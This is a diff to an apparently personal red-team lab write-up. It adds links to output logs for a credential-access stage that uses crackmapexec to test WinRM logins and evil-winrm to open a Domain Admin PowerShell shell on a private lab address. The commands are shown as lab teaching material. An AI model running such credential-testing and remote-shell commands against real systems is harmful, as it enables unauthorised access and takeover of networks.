@@ -55,11 +55,16 @@ crackmapexec winrm 192.168.56.101 -u Administrator -p 'password'
 ```
 - Checks if the credentials allow access over the WINRM service, which is needed for remote PowerShell shell access.
 
+See [stage3_cme_winrm.txt](https://github.com/xMohammadAsimx/RedBlue-Enterprise-Lab/blob/main/phase2_red_team/stage3_credential_access/stage3_cme_winrm.txt)
+
 ### 4. Remote Shell Access with Evil-WinRM
 
 ``` bash
 evil-winrm -i 192.168.56.101 -u Administrator -p 'password'
 ```
+
+See [remote_shell.txt](https://github.com/xMohammadAsimx/RedBlue-Enterprise-Lab/blob/main/phase2_red_team/stage3_credential_access/remote_shell.txt)
+
 - Launches an interactive PowerShell session on the remote machine as the authenticated domain user (Domain Admin in this case).
 
 - Confirmed access as redblue\Administrator
